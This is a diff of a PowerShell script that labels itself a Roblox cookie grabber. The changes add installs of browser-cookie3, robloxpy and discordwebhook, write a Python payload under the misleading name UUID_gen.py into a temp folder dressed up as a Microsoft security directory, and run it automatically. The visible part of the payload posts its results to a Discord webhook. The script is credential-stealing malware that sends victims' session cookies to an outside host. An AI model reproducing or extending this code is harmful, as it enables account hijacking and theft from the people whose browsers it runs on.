@@ -5,7 +5,6 @@
 # For grab Roblox Cookies
 #
 #####################################################################
-
 ############################VARIABLES################################
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
 $webHookUrlPYTHON2="""$webHookUrl"""
@@ -13,8 +12,11 @@ $webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
 $webHookUrl2="$"+"webHookUrl"
 #####################################################################
 
-
-
+py -m pip install robloxpy
+py -m pip install requests
+py -m pip install discordwebhook
+py -m pip install browser-cookie3
+#all libs
 
 cd C:\Windows\Temp\Win.microsoft.Security.temp
 Set-Content UUID_gen.py "
@@ -131,4 +133,4 @@ discord.post(
 )
 
 "
-pause
+python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.py
